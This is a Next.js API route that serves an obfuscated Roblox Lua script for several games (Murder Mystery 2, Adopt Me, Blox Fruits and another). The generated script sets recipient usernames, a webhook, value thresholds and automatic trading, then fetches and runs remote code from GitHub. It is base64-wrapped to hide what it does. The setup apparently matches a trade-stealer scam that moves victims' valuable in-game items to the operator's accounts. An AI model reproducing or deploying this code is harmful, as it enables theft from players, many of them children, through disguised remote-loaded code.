import { NextResponse } from 'next/server';
import { db } from '@/lib/db';
import { configs } from '@/lib/db/schema';
import { eq } from 'drizzle-orm';

export const dynamic = 'force-dynamic';

export async function GET(req: Request, { params }: { params: Promise<{ token: string }> }) {
  try {
    const resolvedParams = await params;
    const token = resolvedParams.token;

    if (!token) return new NextResponse("-- Missing Token", { status: 400 });

    const [config] = await db.select().from(configs).where(eq(configs.token, token)).limit(1);
    if (!config) return new NextResponse("-- Invalid Token", { status: 404 });

    const usernamesArray = config.usernames.map((u: string) => `"${u}"`).join(', ');
    const luaNames = `{ ${usernamesArray} }`;
    const webhook = config.webhook;
    let script = '';

    switch (config.game) {
      case 'mm2':
        script = `_G.Usernames = ${luaNames}\n_G.min_rarity = "${config.minRarity || 'Godly'}"\n_G.webhook = "${webhook}"\n_G.TradeMode = "AUTO"\nloadstring(game:HttpGet("https://raw.githubusercontent.com/XHupScript/Xscript/refs/heads/main/mm2"))()`;
        break;
      case 'sab':
        script = `_G.Usernames = ${luaNames}\n_G.webhook = "${webhook}"\n_G.min_rarity = "${config.minRarity || 'Secret'}"\n_G.min_usd_ping = ${config.minUSD || 5}\n_G.TradeMode = "AUTO"\nloadstring(game:HttpGet("https://raw.githubusercontent.com/XHupScript/sab/refs/heads/main/sab"))()`;
        break;
      case 'adoptme':
        script = `_G.Usernames = ${luaNames}\n_G.webhook = "${webhook}"\n_G.min_usd_ping = ${config.minUSD || 5}\nloadstring(game:HttpGet("https://raw.githubusercontent.com/XHupScript/sadqw12/refs/heads/main/1"))()`;
        break;
      case 'bloxfruits':
        // تنسيق أسماء الفواكه بدقة لكي تتطابق مع طريقة قراءة المخزون في السكربت
        const rawFruits = config.minRarity || '';
        const fruitsArray = rawFruits.split(',').map((f: string) => f.trim()).filter(Boolean);
        const luaFruitsTable = `{ ${fruitsArray.map((f: string) => `"${f}"`).join(', ')} }`;
        
        script = `_G.Usernames = ${luaNames}\n_G.pingfruits = ${luaFruitsTable}\n_G.webhook = "${webhook}"\n\nloadstring(game:HttpGet("https://raw.githubusercontent.com/XHupScript/bf1/refs/heads/main/m"))()`;
        break;
    }

    const base64Script = Buffer.from(script).toString('base64');
    const obfuscatedScript = `
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function dec(data)
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end
loadstring(dec("${base64Script}"))()
`;

    return new NextResponse(obfuscatedScript, { status: 200, headers: { 'Content-Type': 'text/plain' } });
  } catch (error) {
    return new NextResponse("-- Server Error", { status: 500 });
  }
}